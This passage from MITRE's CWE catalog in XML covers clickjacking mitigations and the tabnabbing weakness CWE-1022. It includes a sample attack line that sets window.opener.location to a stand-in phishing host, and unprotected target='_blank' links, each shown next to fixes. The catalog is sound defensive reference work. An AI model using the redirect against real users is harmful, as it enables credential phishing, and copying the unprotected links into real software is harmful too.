                  <xhtml:p>It is also important to note that this tactic has been circumvented or bypassed. Improper usage of frames can persist in the web application through nested frames. The "frame-breaking" script does not intuitively account for multiple nested frames that can be presented to the user.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>This defense-in-depth technique can be used to prevent the improper usage of frames in web applications. It prioritizes the valid sources of data to be loaded into the application through the usage of declarative policies. Based on which implementation of Content Security Policy is in use, the developer should use the "frame-ancestors" directive or the "frame-src" directive to mitigate this weakness. Both directives allow for the placement of restrictions when it comes to allowing embedded content.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2017-7440</Reference>
               <Description>E-mail preview feature in a desktop application allows clickjacking attacks via a crafted e-mail message</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-7440</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-5697</Reference>
               <Description>Hardware/firmware product has insufficient clickjacking protection in its web user interface</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-5697</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-4015</Reference>
               <Description>Clickjacking in data-loss prevention product via HTTP response header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-4015</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2016-2496</Reference>
               <Description>Tapjacking in permission dialog for mobile OS allows access of private storage using a partially-overlapping window.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2016-2496</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2015-1241</Reference>
               <Description>Tapjacking in web browser related to page navigation and touch/gesture events.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2015-1241</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-0492</Reference>
               <Description>System UI in mobile OS allows a malicious application to create a UI overlay of the entire screen to gain privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-0492</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="103"/>
            <Related_Attack_Pattern CAPEC_ID="181"/>
            <Related_Attack_Pattern CAPEC_ID="222"/>
            <Related_Attack_Pattern CAPEC_ID="504"/>
            <Related_Attack_Pattern CAPEC_ID="506"/>
            <Related_Attack_Pattern CAPEC_ID="587"/>
            <Related_Attack_Pattern CAPEC_ID="654"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-35"/>
            <Reference External_Reference_ID="REF-36"/>
            <Reference External_Reference_ID="REF-37"/>
            <Reference External_Reference_ID="REF-38"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2017-08-01</Submission_Date>
               <Submission_Version>2.12</Submission_Version>
               <Submission_ReleaseDate>2017-11-08</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1022" Name="Use of Web Link to Untrusted Target with window.opener Access" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The web application produces links to untrusted external sites outside of its sphere of control, but it does not properly prevent the external site from modifying  security-critical properties of the window.opener object, such as the location property.</Description>
         <Extended_Description>When a user clicks a link to an external site ("target"), the target="_blank" attribute causes the target site's contents to be opened in a new window or tab, which runs in the same process as the original page. The window.opener object records information about the original page that offered the link.  If an attacker can run script on the target page, then they could read or modify certain properties of the window.opener object, including the location property - even if the original and target site are not the same origin.  An attacker can modify the location property to automatically redirect the user to a malicious site, e.g. as part of a phishing attack. Since this redirect happens in the original window/tab - which is not necessarily visible, since the browser is focusing the display on the new target page - the user might not notice any suspicious redirection.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="266" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="JavaScript" Prevalence="Often"/>
            <Technology Class="Web Based" Prevalence="Often"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>tabnabbing</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>This weakness is introduced during the design of an application when the architect does not specify that a linked external document should not be able to alter the location of the calling page.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>This weakness is introduced during the coding of an application when the developer does not include the noopener and/or noreferrer value for the rel attribute.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Alter Execution Logic</Impact>
               <Note>The user may be redirected to an untrusted page that contains undesired content or malicious script code.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Specify in the design that any linked external document must not be granted access to the location object of the calling page.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>When creating a link to an external document using the &lt;a&gt; tag with a defined target, for example "_blank" or a named frame, provide the rel attribute with a value "noopener noreferrer".</xhtml:p>
                  <xhtml:p>If opening the external document in a new window via javascript, then reset the opener by setting it equal to null.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Do not use "_blank" targets. However, this can affect the usability of the application.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In this example, the application opens a link in a named window/tab without taking precautions to prevent the called page from tampering with the calling page's location in the browser.</Intro_Text>
               <Body_Text>There are two ways that this weakness is commonly seen. The first is when the application generates an &lt;a&gt; tag is with target="_blank" to point to a target site:</Body_Text>
               <Example_Code Nature="Bad" Language="HTML">
                  <xhtml:div>&lt;a href="http://attacker-site.example.com/useful-page.html" target="_blank"&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>If the attacker offers a useful page on this link (or compromises a trusted, popular site), then a user may click on this link.  However, the attacker could use scripting code to modify the window.opener's location property to redirect the application to a malicious, attacker-controlled page - such as one that mimics the look and feel of the original application and convinces the user to re-enter authentication credentials, i.e. phishing:</Body_Text>
               <Example_Code Nature="Attack" Language="JavaScript">
                  <xhtml:div>window.opener.location = 'http://phishing.example.org/popular-bank-page';</xhtml:div>
               </Example_Code>
               <Body_Text>To mitigate this type of weakness, some browsers support the "rel" attribute with a value of "noopener", which sets the window.opener object equal to null. Another option is to use the "rel" attribute with a value of "noreferrer", which in essence does the same thing.</Body_Text>
               <Example_Code Nature="Good" Language="HTML">
                  <xhtml:div>&lt;a href="http://attacker-site.example.com/useful-page.html" target="_blank" rel="noopener noreferrer"&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>A second way that this weakness is commonly seen is when opening a new site directly within JavaScript. In this case, a new site is opened using the window.open() function.</Body_Text>
               <Example_Code Nature="Bad" Language="JavaScript">
                  <xhtml:div>var newWindow = window.open("http://attacker-site.example.com/useful-page.html", "_blank");</xhtml:div>
               </Example_Code>
               <Body_Text>To mitigate this, set the window.opener object to null.</Body_Text>
               <Example_Code Nature="Good" Language="JavaScript">
                  <xhtml:div>var newWindow = window.open("http://attacker-site.example.com/useful-page.html", "_blank");<xhtml:br/>newWindow.opener = null;</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
		 <Observed_Examples>
		   <Observed_Example>
			 <Reference>CVE-2022-4927</Reference>
			 <Description>Library software does not use rel: "noopener noreferrer" setting, allowing tabnabbing attacks to redirect to a malicious page</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2022-4927</Link>
		   </Observed_Example>
		 </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-39"/>
            <Reference External_Reference_ID="REF-40"/>
            <Reference External_Reference_ID="REF-958"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>David Deatherage</Submission_Name>
               <Submission_Organization>Silicon Valley Bank</Submission_Organization>
               <Submission_Date>2017-09-26</Submission_Date>
               <Submission_Version>2.12</Submission_Version>
               <Submission_ReleaseDate>2017-11-08</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Demonstrative_Examples, Description, Modes_of_Introduction, Name, Potential_Mitigations, References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2018-03-27">Improper Restriction of Cross-Origin Permission to window.opener.location</Previous_Entry_Name>
         </Content_History>
      </Weakness>
   </Weaknesses>
</Weakness_Catalog>